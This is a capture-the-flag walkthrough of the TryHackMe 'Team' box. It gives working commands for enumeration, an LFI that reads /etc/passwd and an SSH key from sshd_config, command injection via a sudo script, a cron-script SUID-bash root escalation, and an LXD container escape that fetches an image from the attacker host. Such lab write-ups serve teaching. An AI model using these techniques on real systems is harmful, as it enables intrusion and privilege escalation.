# Try Hack Me - Team

**Categories:** Security, boot2root, enumeration, misconfiguration  
**Difficulty:** Easy  

Commands used in this guide use the exported variable $IP (`export IP=10.10.93.216`) in place of the target machine's IP address.

## 1. Enumeration 1 - rustscan, nmap

Having launched the box, we run rustscan followed by an nmap version scan of the 3 discovered ports (21, 22, and 80) : 

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap $IP -sV -p21,22,80
...snip...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
```

Google and searchsploit give no relevant vulnerabilities for the discovered versions. Anonymous login to the FTP server is deactivated. Navigating to the application on 80 reveals a default apache2 welcome page with a modified \<title\> tag revealing a virtual host :

```html
<title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>
```

A gobuster scan using dirbuster's common wordlist on the original IP gives no additional routes, so we add 'team.thm' to `/etc/hosts` and continue with the enumeration of the newly discovered host.

## 2. Enumeration 2 - gobuster, dir

Navigating to the application at 'team.thm' reveals a basic landing page and photo gallery. A gobuster scan with dirbuster's common wordlist discovers the routes `/scripts/` (which gives a 403 on directory listing) and `robots.txt`. Curling `robots.txt` gives us a possible username "dale", but brute force attempts on SSH and FTP using hydra and the rockyou wordlist fail to find valid credentials.

We can probably assume that the discovered `/scripts/` directory contains scripts - we therefore repeat the gobuster scan on the discovered directory using the `-x` flag to search for various script (js, php, sh) and development (md, txt, bak) extensions :

```console
┌──(kali㉿kali)-[~/Documents/tthm]
└─$ gobuster dir -u team.thm/scripts/ -w /usr/share/dirb/wordlists/common.txt -x js,php,sh,md,txt,bak
...snip...
/script.txt           (Status: 200) [Size: 597]
```

Curling down the discovered file, we find a Bash script that attempts to interact with FTP and includes a comment regarding plaintext credentials in a previous version of the script with a different extension : 


```bash
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
...snip...
# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

We use ffuf to fuzz for the old extension using SecLists's extension wordlist (`https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-extensions.txt`) (`ffuf -w extensions.txt -u http://team.thm/scripts/scriptFUZZ`), discovering `/scripts/scripts.old`. Curling down the script, we find the plaintext credentials mentioned in the `.txt.` version :

```bash
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " PASSWORD
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
...snip...
```

## 3. Vhost discovery - ftp

The discovered credentials provide access to the FTP server, revealing `workshare/New_site.txt` : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/team]
└─$ cat New_site.txt
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles
```

This give us another potential username "gyles", a probable location for an insecure private key (presumably `/etc/ssh/config` or `/etc/ssh/sshd_config`) and most importantly, a new vhost ".dev" (we could have made the same discovery with gobuster in DNS mode and [SecList's DNS namelist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/namelist.txt)).

## 4. Foothold - LFI, private key 

Curling the newly discovered vhost reveals a development page including a link with a suspicious looking query param : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/team]
└─$ curl team.thm -H "Host: dev.team.thm"
<html>
 <head>
  <title>UNDER DEVELOPMENT</title>
 </head>
 <body>
  Site is being built<a href=script.php?page=teamshare.php </a>
<p>Place holder link to team share</p>
 </body>
</html>
```

This is likely an LFI or RFI vulnerability - normally we might want to automate the testing of this vulnerability, but jumping straight to `/etc/passwd` shows that no LFI protections are in place :

```console
┌──(kali㉿kali)-[~/Documents/tthm/team]
└─$ curl team.thm/script.php?page=/etc/passwd -H "Host: dev.team.thm"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...snip...
```

The `/etc/passwd` file confirms the already discovered usernames (dale, gyles, ftpuser). We can now target the config file containing copied private keys mentioned in the file discovered in FTP. `/etc/ssh/config` looks pretty standard, but `/etc/ssh/sshd_config` includes a private key (just like Gyles asked!) : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/team]
└─$ curl team.thm/script.php?page=/etc/ssh/sshd_config -H "Host: dev.team.thm"
#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.
...snip...
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
```

Copy the private key, save it on your local machine, remove the first line and the "#" symbols (`cat the-key | tr -d '#' > id_rsa` should speed this up), chmod it to 600, and use it to connect as dale (if ssh complains about the formatting of the key, make sure you've removed the first line, all of the comment symbols, and that the file ends with an empty line) : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/team]
└─$ ssh dale@team.thm -i id_rsa
...snip...
dale@TEAM:~$ id
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
```
The user flag is at `/home/dale/user.txt`.

It is interesting to note that effective enumeration would have eliminated the need to discover the FTP credentials in `script.old` - scanning for virtual hosts would have discovered the LFI vulnerability at `dev.team.thm`, and the `/etc/ssh/sshd_config` file is a common target for enumerating a system vulnerable to LFI - but we don't usually expect to find private keys copied into the file...

## 5. Privesc, dale -> gyles - command injection

The room intro tells us that there are 2 methods for privilege escalation - one intended, one unintended (you might already have noticed the unintended method in dale's `id` output). We'll start with the intended method before looking at the unintended method in section 7.

Running `sudo -l` as dale we find that they can run the script at `/home/gyles/admin_checks` as the gyles user without a password. The `admin_checks` script (which is not writeable by dale) is a basic back up script : 

```bash
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

This all looks ok until line 9, where raw user input provided to read on line 8 is executed as code (`$error 2>/dev/null`). Combined with the sudo permissions on the file this command injection vulnerability allows us to execute commands as the gyles user : 

```console
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: this is safe 
Enter 'date' to timestamp the file: /bin/bash 
The Date is id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```

To improve your shell, we can copy dale's `authorized_keys` file to `/home/gyles/.ssh/authorized_keys`, allowing us to connect as gyles with the same key (you'll need to change the permissions on the file as dale before copying them as gyles).

## 6. Privesc, gyles -> root - cronjob

We saw above that gyles is a member of the "admin" group. This sounds like it might be a big deal, so we search for all files and directories belonging to the admin group using `find` : 

```console
gyles@TEAM:/opt/admin_stuff$ find / -group admin 2>/dev/null
/usr/local/bin
/usr/local/bin/main_backup.sh
/opt/admin_stuff
```

`/opt/admin_stuff` contains a script `script.sh` that is owned by root : 

```bash
#!/bin/bash
#I have set a cronjob to run this script every minute

dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```

Based on this comment, `/usr/local/bin/main_backup.sh` is run as root once a minute by a cronjob, and we've already seen that members of the admin group can write to the `main_backup.sh` script - in other words, we can execute arbitrary code as root. Keeping things simple, we add a line that copies an SUID bash binary into tmp : 

```console
gyles@TEAM:~$ echo "cp /bin/bash /tmp/bd && chmod u+s /tmp/bd" >> /usr/local/bin/main_backup.sh
```

After a minute or so, the script is run, and we find the SUID binary in `/tmp` :

```console
gyles@TEAM:~$ ls -l /tmp
total 1104
-rwsr-xr-x 1 root root 1113504 Oct 30 00:37 bd
...snip...
gyles@TEAM:~$ /tmp/bd -p
bd-4.4# whoami
root
```

The root flag is at `/root/root.txt`. 

Again, there is another way to find the information required for this step. Gyles' `.bash_history` is extensive, and includes references to all the files used here - `/usr/local/bin/main_backup.sh`, `/opt/admin_stuff/script.sh` - as well as calls to `sudo su` and `cronjob -l`.

## 7. Privesc (unintended), date -> root - lxd 

The unintended privesc method allows us to move from dale directly to root by exploiting a privilege escalation method available to members of the `lxd` and `lxc` groups : 

```console
dale@TEAM:~$ id
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
```

Lxd and Lxc are used in the [creation and management of containers in Linux environments](https://linuxcontainers.org/lxd/introduction/). It represents a privilege escalation vector in so far as it allows members of the lxd or lxc groups to create containers in which they have root permissions - the exploit involves creating such a container and mounting the host file system, providing access to the file system as a root-level user. This sounds complicated, but is actually quite simple to perform - here, we'll be using a [method included in the HackTricks guide](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation).

To start, we'll need to create the image that will be used to create the container on the target. This requires pulling a [helper script from github](https://github.com/saghul/lxd-alpine-builder/blob/master/build-alpine) - as THM machines are isolated from the internet, we'll do this on the attack machine. Download the script and run it as follows : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/team]
└─curl https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine -o alpine-builder.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7662  100  7662    0     0  78989      0 --:--:-- --:--:-- --:--:-- 79812

┌──(kali㉿kali)-[~/Documents/tthm/team]
└─$ sudo bash ./alpine-builder.sh
Determining the latest release... v3.14
...snip... (lots and lots of ...snip...)
```

The result is a tar.gz archive that contains the image information. Download this archive to dale's home directory on the target machine :

```console
dale@TEAM:~$ wget ATTACK-IP/alpine-v3.14-x86_64-20211029_1951.tar.gz
```

and import the image to lxc :

```console
dale@TEAM:~$ lxc image import ./alpine-v3.14-x86_64-20211029_1951.tar.gz --alias EXPLOIT-IMAGE
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: 9ef402a8790d4723b2a7b15ddcb744e79d2570b92ad2259bda04747168caaad4
```

You can now create a container from the image. We start by initializing lxd (accept all the default settings) before creating the container from the image with the flag `security.privileged=true` :

```console
dale@TEAM:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
...snip...
dale@TEAM:~$ lxc init EXPLOIT-IMAGE EXPLOIT-CONTAINER -c security.privileged=true
Creating EXPLOIT-CONTAINER
```

We can now mount the host file system in the container, giving full read access to the host file system from within the container at `/mnt/root` :

```console
dale@TEAM:~$ lxc config device add EXPLOIT-CONTAINER EXPLOIT-DEVICE disk source=/ path=/mnt/root recursive=true
Device EXPLOIT-DEVICE added to EXPLOIT-CONTAINER
```

We can now boot the container and start a shell session. Navigating to `/mnt/root/`, we find the host file system, and we can access it as root :

```console
dale@TEAM:~$ lxc start EXPLOIT-CONTAINER
dale@TEAM:~$ lxc exec EXPLOIT-CONTAINER /bin/sh
~ # whoami
root
~ # ls -l /mnt/root/home
total 12
drwxr-xr-x    7 1000     1000          4096 Oct 29 23:54 dale
drwxr-xr-x    5 nobody   nobody        4096 Jan 15  2021 ftpuser
drwxr-xr-x    6 1001     1001          4096 Jan 17  2021 gyles
```

Easy (!). Interestingly, this isn't the only THM box that accidentally left a low-privilege user in the lxc/lxd group, and I'm not really sure how it happens - an artefact of the image they use to build the box, I imagine?